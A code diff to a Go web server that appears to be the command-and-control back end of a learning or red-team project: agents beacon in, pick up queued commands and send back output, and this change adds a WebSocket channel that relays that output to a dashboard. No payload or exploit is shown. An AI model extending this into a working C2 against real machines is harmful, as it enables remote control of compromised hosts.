@@ -9,12 +9,19 @@ import (
 	"time"
 
 	"sOPown3d/shared"
+
+	"github.com/gorilla/websocket"
 )
 
 var (
 	connectionCount = 0
-	pendingCommands = make(map[string]shared.Command)
-	templates       *template.Template // var pour les templates
+	pendingCommands = make(map[string]shared.Command) // init une map avec les commandes en attentes d'execution par l'agent
+	templates       *template.Template                // var pour les templates
+
+	upgrader = websocket.Upgrader{
+		CheckOrigin: func(r *http.Request) bool { return true }, // TODO : Wtf is a websocket Upgrader
+	}
+	wsClients = make(map[string]*websocket.Conn) // init du client pour le webSocket
 )
 
 func init() {
@@ -37,6 +44,7 @@ func main() {
 	http.HandleFunc("/beacon", handleBeacon)
 	http.HandleFunc("/ingest", handleIngest)
 	http.HandleFunc("/command", handleSendCommand)
+	http.HandleFunc("/websocket", handleWebSocket)
 	http.HandleFunc("/", handleDashboard)
 
 	err := http.ListenAndServe("127.0.0.1:"+port, nil)
@@ -47,13 +55,15 @@ func main() {
 
 func handleDashboard(w http.ResponseWriter, _ *http.Request) {
 	data := shared.DashboardData{
-		DefaultAgent: "AgentID à voir comment recupérer dynamiquement",
+		AgentInfo:    "AgentID à voir comment recupérer dynamiquement", // Nul
+		DefaultAgent: "Nicolass-MacBook-Pro.local",
 	}
 
 	err := templates.ExecuteTemplate(w, "dashboard.html", data)
 	if err != nil {
 		http.Error(w, err.Error(), http.StatusInternalServerError)
 		fmt.Println("Erreur template:", err)
+		return
 	}
 }
 
@@ -113,13 +123,44 @@ func handleIngest(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	var output string
-	if err := json.NewDecoder(r.Body).Decode(&output); err != nil {
+	var result struct {
+		AgentID string `json:"agent_id"`
+		Output  string `json:"output"`
+	}
+
+	if err := json.NewDecoder(r.Body).Decode(&result); err != nil {
 		http.Error(w, err.Error(), 400)
 		return
 	}
 
-	w.Write([]byte(output)) // A quoi sert cette ligne ??
-	fmt.Printf("> %s\n", output)
+	fmt.Printf("> agent_id=%s,\r\n output=%q\n", result.AgentID, result.Output)
 
+	if conn, exists := wsClients[result.AgentID]; exists {
+		fmt.Println("📡 Envoi WS à", result.AgentID)
+		conn.WriteMessage(websocket.TextMessage, []byte(result.Output))
+	} else {
+		fmt.Println("⚠️ Aucun WS pour", result.AgentID)
+	}
+}
+
+func handleWebSocket(w http.ResponseWriter, r *http.Request) {
+	agentId := r.URL.Query().Get("agent") // clé dans l'url
+	fmt.Println("🛰️ Nouveau WS pour agent:", agentId)
+
+	conn, err := upgrader.Upgrade(w, r, nil)
+	if err != nil {
+		fmt.Println("Erreur upgrade WS:", err)
+		return
+	}
+
+	wsClients[agentId] = conn
+
+	// Pour garder la connection en vie :
+	for {
+		if _, _, err := conn.ReadMessage(); err != nil { // Si erreur il y'a
+			fmt.Println("WS fermé pour agent:", agentId, "err:", err)
+			delete(wsClients, agentId) // Supprime la connexion avec l'agent ID ? Est ce qu'une autre est créer ?
+			break
+		}
+	}
 }
